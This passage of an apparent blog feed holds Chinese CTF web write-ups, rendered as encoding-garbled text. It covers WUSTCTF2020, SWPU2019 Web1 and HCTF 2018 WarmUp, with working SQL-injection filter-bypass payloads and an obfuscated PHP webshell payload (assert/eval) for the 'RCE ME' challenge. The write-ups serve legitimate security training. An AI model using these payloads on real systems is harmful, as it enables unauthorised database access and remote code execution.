&lt;p>ä¸‹é¢æ˜¯æŸ¥è¯¢åˆ°çš„ä¸¤ä¸ªè¡¨F1naI1y ã€FlaaaaagåŠç»“æ„&lt;/p>
&lt;blockquote>
&lt;p>F1naI1y ====&amp;gt; id,username,password&lt;/p>
&lt;p>Flaaaaag ====&amp;gt; id,fl4gawsl&lt;/p></description></item><item><title>WUSTCTF2020 æœ´å®æ— å</title><link>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</link><pubDate>Fri, 16 Apr 2021 15:33:32 +0000</pubDate><guid>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</guid><description>&lt;p>è¿›å…¥é¡µé¢ç›´æ¥æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416103737.png" alt="">&lt;/p>
&lt;p>è¯•è¯•å…¶ä»–çš„åœ°æ–¹ï¼Œæˆ‘çš„ä¹ æƒ¯æ˜¯gitæ³„éœ²ã€è¯·æ±‚å¤´ã€robots.txtã€hint.txtéƒ½çœ‹çœ‹ã€‚æœç„¶åœ¨robotsä¸‹æœ‰å†…å®¹&lt;/p>
&lt;blockquote>
&lt;p>User-agent: *
Disallow: /fAke_f1agggg.php&lt;/p>
&lt;/blockquote>
&lt;p>è®¿é—®&lt;code>fAke_f1agggg.php&lt;/code>å¹¶ä¸”æŠ“åŒ…ï¼Œåœ¨å“åº”å¤´é‡Œæœ‰æç¤ºã€‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416105630.png" alt="">&lt;/p>
&lt;p>è®¿é—®&lt;code>fl4g.php&lt;/code>æ‰æ­£å¼å¼€å§‹ï¼Œæºç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">img&lt;/span> &lt;span style="color:#a6e22e">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/img.jpg&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">error_reporting&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">highlight_file&lt;/span>(&lt;span style="color:#66d9ef">__file__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//level 1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;num&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $num &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;num&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">intval&lt;/span>($num) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2020&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">intval&lt;/span>($num &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2021&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;å»éæ´²å§&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//level 2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;md5&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $md5&lt;span style="color:#f92672">=&lt;/span>$_GET[&lt;span style="color:#e6db74">&amp;#39;md5&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ($md5&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#a6e22e">md5&lt;/span>($md5))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;å»éæ´²å§&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//get flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;get_flag&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $get_flag &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;get_flag&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">strstr&lt;/span>($get_flag,&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $get_flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_ireplace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;cat&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wctf2020&amp;#34;&lt;/span>, $get_flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>($get_flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;å¿«åˆ°éæ´²äº†&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;å»éæ´²å§&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€å…³ä¸€å…³çš„&lt;strong>bypass&lt;/strong>ã€‚&lt;/p></description></item><item><title>SWPU2019 Web1</title><link>/posts/ctf/swpu2019web1/</link><pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate><guid>/posts/ctf/swpu2019web1/</guid><description>&lt;p>ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œå†çœ‹ä¸‹urlåœ°å€ä¸ºlogin.phpï¼Œç¡®è®¤äº†ä½¿ç”¨çš„æ˜¯php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091617.png" alt="">&lt;/p>
&lt;p>ç›´æ¥æŸ¥çœ‹æºç ï¼Œåœ¨æºç ä¸­æ‰¾åˆ°äº†register.phpã€‚å…ˆæ³¨å†Œä¸€ä¸ªè¿›å»çœ‹ä¸€çœ‹ã€‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091705.png" alt="">&lt;/p>
&lt;p>æ˜¯ä¸€ä¸ªå‘å¸ƒå¹¿å‘Šçš„ä¿¡æ¯é¡µï¼Œå‘å¸ƒå¹¿å‘Šæ—¶éœ€è¦è¾“å…¥å¹¿å‘Šçš„æ ‡é¢˜å’Œå†…å®¹ï¼Œè”æƒ³ä¸€ä¸‹ä¹‹å‰åšè¿‡çš„å‘å¸ƒæ–‡ç« çš„ï¼Œåº”è¯¥æ˜¯sqlæ³¨å…¥ï¼Œè¾“å…¥å¹¿å‘Šæ ‡é¢˜è¾“å…¥ä¸€ä¸ªå•å¼•å·&lt;code>'&lt;/code>è¯•ä¸€è¯•&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091924.png" alt="">&lt;/p>
&lt;p>å¹¿å‘Šè¯¦æƒ…ä¸­å‡ºç°äº†æ•°æ®åº“æŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091959.png" alt="">çŒœæµ‹åº”è¯¥æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå‘å¸ƒæ—¶åŠ ä¸Šä¸€äº›è½¬ä¹‰å­—ç¬¦æ²¡æœ‰å‡ºç°é”™è¯¯ï¼Œä½†æ˜¯æŸ¥çœ‹è¯¦æƒ…æ—¶å†æ¬¡ä»æ•°æ®åº“ä¸­å–å‡ºå¸¦æœ‰payloadçš„æ•°æ®ï¼Œå¯ä»¥æ‰§è¡Œsqlè¯­å¥ã€‚è€Œä¸”ä¸Šé¢çš„å•å¼•å·æµ‹è¯•å‡ºæ¥äº†æ˜¯&lt;strong>å­—ç¬¦å‹å•å¼•å·é—­åˆ&lt;/strong>ã€‚&lt;/p>
&lt;p>æ¥ä¸‹æ¥æ˜¯å°è¯•è¿‡æ»¤ã€‚æˆ‘è¯•å‡ºæ¥çš„æœ‰ç©ºæ ¼ï¼ˆä½¿ç”¨&lt;code>/**/&lt;/code>ç»•è¿‡ï¼‰ã€orï¼Œandï¼ˆå¯ä»¥ä½¿ç”¨&amp;amp;&amp;amp;ï¼Œ||ï¼‰ï¼ŒåŒæ—¶orè¢«è¿‡æ»¤ï¼Œå°±è¯´æ˜ä¿å­˜æ•°æ®åº“è¡¨åçš„åº“&lt;strong>information_schema&lt;/strong>æ²¡æœ‰åŠæ³•æŸ¥è¯¢ï¼Œå¹¶ä¸”&lt;strong>orderby&lt;/strong>ä¹Ÿä¸èƒ½ä½¿ç”¨ï¼Œéœ€è¦ä½¿ç”¨å…¶ä»–åŠæ³•è·å–è¡¨å†…å®¹ã€‚&lt;/p>
&lt;p>æµ‹è¯•ä¸€ä¸‹å½“å‰è¡¨çš„å­—æ®µæ•°ï¼Œä»1å¼€å§‹åŠ ï¼Œä¸€ç›´ä¼šæŠ¥å­—æ®µæ•°ä¸åŒ¹é…ï¼Œç›´åˆ°å°è¯•åˆ°22ã€‚è¿˜éœ€è¦ä¸»ä¹‰çš„æ˜¯æ‰§è¡Œçš„sqlè¯­å¥åé¢çš„ &lt;code>LIMIT 0,1&lt;/code>éœ€è¦é—­åˆï¼Œæ‰€ä»¥æœ€åæ·»åŠ äº†ä¸€ä¸ªå•å¼•å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415092716.png" alt="">&lt;/p>
&lt;p>è¯´æ˜å›æ˜¾ä½æ˜¯2å’Œ3ã€‚&lt;/p>
&lt;p>ç”±äºæ²¡æœ‰åŠæ³•æŸ¥è¯¢è¡¨åï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±çŒœæµ‹ï¼ŒCTFæ¯”èµ›ä¸­å¸¸è§çš„è¡¨åå°±æ˜¯flagã€usersã€ä¸¾åŠæ–¹çš„ç¼©å†™å•¥çš„ã€‚&lt;del>è¿™ç§æ²¡æœ‰åŠæ³•æŸ¥è¯¢è¡¨åçš„é¢˜ç›®è¡¨ååº”è¯¥éƒ½ä¸ä¼šè®¾ç½®å¤ªéš¾&lt;/del>&lt;/p>
&lt;p>æµ‹è¯•çš„è¯­å¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“æµ‹åˆ°&lt;code>users&lt;/code>è¡¨æ—¶è¿”å›äº†å½“å‰å­—æ®µæ•°ä¸åŒ¹é…çš„é”™è¯¯ï¼Œè¯´åusersé‡Œæœ‰å¤šä¸ªå­—æ®µï¼Œè‚¯å®šæ²¡æœ‰åŠæ³•æ˜¾ç¤ºåœ¨ä¸€åˆ—ä¸­ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æ˜¯çŒœusersè¡¨çš„å­—æ®µæ•°ã€‚&lt;/p>
&lt;p>é¦–å…ˆè®²è§£ä¸€æ³¢&lt;strong>æ— åˆ—åæ³¨å…¥&lt;/strong>ã€‚&lt;/p>
&lt;p>å…ˆæ¥ä¸ªæ­£å¸¸è¡¨ï¼ˆflagï¼‰çš„æŸ¥è¯¢&lt;/p>
&lt;p>&lt;img src="D:%5CDROPS%5CCTF%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3%5CBUUCTF%5CWeb%5BSWPU2019%5DWeb1%5C20210415094632.png" alt="">&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“åœ¨sqlè¯­å¥æŸ¥è¯¢çš„æ—¶å€™ï¼Œå¯ä»¥ç»™åˆ—åèµ·åˆ«åå½¢å¦‚&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094059.png" alt="">&lt;/p>
&lt;p>ä½¿ç”¨è”åˆæŸ¥è¯¢çš„æ—¶å€™ï¼Œåªè¦å‰åè¡¨çš„å­—æ®µæ•°ç›¸åŒï¼Œå‰é¢æŸ¥è¯¢çš„å°±ä¼šæˆä¸ºè¡¨å&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094238.png" alt="">&lt;/p>
&lt;p>æ‰€ä»¥å½“æˆ‘ä»¬ä¸çŸ¥é“flagè¡¨çš„å­—æ®µï¼Œå¹¶ä¸”æƒ³è¦æŸ¥è¯¢é‡Œé¢çš„å†…å®¹æ—¶ï¼Œæ¯”å¦‚æˆ‘æƒ³æŸ¥è¯¢flagè¡¨çš„flagå­—æ®µï¼Œå¯ä»¥æ„é€ &lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094814.png" alt="">&lt;/p>
&lt;p>éœ€è¦ä¸ºå­æŸ¥è¯¢çš„ç»“æœå†èµ·ä¸€ä¸ªåˆ«åï¼ˆå›¾ä¸­ä¸º&lt;code>x&lt;/code>ï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨åˆ—åæŸ¥è¯¢åˆ°äº†å­—æ®µã€‚æ€»ç»“ä¸€ä¸‹æ€è·¯å°±æ˜¯ï¼šè‡ªå·±æ„é€ ä¸€ä¸ªè¡¨åå¹¶ä¸”è”åˆæŸ¥è¯¢æƒ³è¦æŸ¥è¯¢çš„è¡¨åï¼Œå†ä½¿ç”¨&lt;code>group_concat&lt;/code>å‡½æ•°è¾“å‡ºè‡ªå·±æ„é€ çš„è¡¨åã€‚&lt;/p>
&lt;p>æ‰€ä»¥æµ‹è¯•usersè¡¨çš„å­—æ®µæ•°æ—¶ï¼Œå°±é€šè¿‡å½¢å¦‚ä¸Šå›¾çš„æ ¼å¼ï¼Œæ”¹å˜è”åˆæŸ¥è¯¢çš„å­—æ®µæ•°åˆ¤æ–­ã€‚&lt;/p>
&lt;p>æœ€ç»ˆçš„payloadï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>BUUCTFå¯’å‡åˆ·é¢˜-Web</title><link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p>å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰
&lt;a href="https://buuoj.cn/challenges#">BUUCTF&lt;/a>
ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤
&lt;strong>é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨&lt;!-- raw HTML omitted -->Ctrl&lt;!-- raw HTML omitted -->+&lt;!-- raw HTML omitted -->F&lt;!-- raw HTML omitted -->æœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨&lt;/strong>&lt;/p>
&lt;h1 id="20210115">2021.01.15&lt;/h1>
&lt;h1 id="hctf-2018warmup">[HCTF 2018]WarmUp&lt;/h1>
&lt;p>è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png" alt="">&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
 highlight_file(__FILE__);
 class emmm
 {
 public static function checkFile(&amp;amp;$page)
 {
 $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
 if (! isset($page) || !is_string($page)) {
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }

 if (in_array($page, $whitelist)) {
 return true;
 }

 $_page = mb_substr(
 $page,
 0,
 mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }

 $_page = urldecode($page);
 $_page = mb_substr(
 $_page,
 0,
 mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }
 }

 if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
 ) {
 include $_REQUEST[&amp;#39;file&amp;#39;];
 exit;
 } else {
 echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
 } 
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php&lt;/p></description></item><item><title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019rce-me">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME&lt;/h1>
&lt;p>æºç ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
 $code=$_GET[&amp;#39;code&amp;#39;];
 if(strlen($code)&amp;gt;40){
 die(&amp;#34;This is too Long.&amp;#34;);
 }
 if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
 die(&amp;#34;NO.&amp;#34;);
 }
 @eval($code);
}
else{
 highlight_file(__FILE__);
}

// ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>åˆ†æä¸€æ³¢ï¼ŒGETè¯·æ±‚è·å¾—&lt;code>code&lt;/code>ï¼Œæƒ³è¦é€šè¿‡çš„è¯éœ€è¦ç»•è¿‡ä¸¤ä¸ªæ£€æµ‹ï¼š&lt;/p>
&lt;ol>
&lt;li>payloadé•¿åº¦å°äº40&lt;/li>
&lt;li>ä¸èƒ½åŒ…å«&lt;code>a-zã€A-Zã€0-9&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>å’Œä¹‹å‰åšè¿‡DMCTFé‡Œçš„ä¸€ä¸ªä¸èƒ½ç”¨æ•°å­—å’Œå­—æ¯æ„é€ payloadä¸€æ ·ï¼Œå½“æ—¶å‚è€ƒçš„åšå®¢æ˜¯phith0nå¸ˆå‚…çš„:&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell&lt;/a>ï¼Œè¿™æ¬¡æ‘¸åˆ°äº†ç›¸å…³æ–‡ç« ï¼š&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡&lt;/a>ã€‚&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>urlç¼–ç &lt;/code>+&lt;code>~&lt;/code>å–åæ„é€ ä¸å¯è§å­—ç¬¦ä¸²ï¼Œç„¶ååŠ ä¸Šphp7ç‰ˆæœ¬ä»¥åæ”¯æŒäº†ä½¿ç”¨ï¼š&lt;code>($a)()&lt;/code>è¿™æ ·çš„æ–¹æ³•åŠ¨æ€æ‰§è¡Œå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š&lt;code>assert(eval($_POST[â€˜aâ€™]))&lt;/code>&lt;/p>
&lt;p>å…ˆæ„é€ &lt;code>assert&lt;/code>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;assert&amp;#39;);

//ç»“æœï¼š%9E%8C%8C%9A%8D%8B
&lt;/code>&lt;/pre>&lt;p>å†æ„é€ &lt;code>eval($_POST['a'])&lt;/code>ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);

//ç»“æœï¼š%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code>&lt;/pre>&lt;p>å®Œæ•´payloadï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code>&lt;/pre>&lt;p>ç½‘ç«™è·å¾—è¯·æ±‚ä»¥åä¼šè¿›è¡Œurlè§£ç ï¼Œç”±äºæ˜¯ä¸å¯è§å­—ç¬¦å¯ä»¥ç»•è¿‡é•¿åº¦å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹‹åæ‰§è¡Œä»£ç æ—¶ï¼Œå‰é¢çš„&lt;code>~&lt;/code>å–åå†è·å¾—çœŸæ­£çš„å‡½æ•°åã€‚&lt;/p>
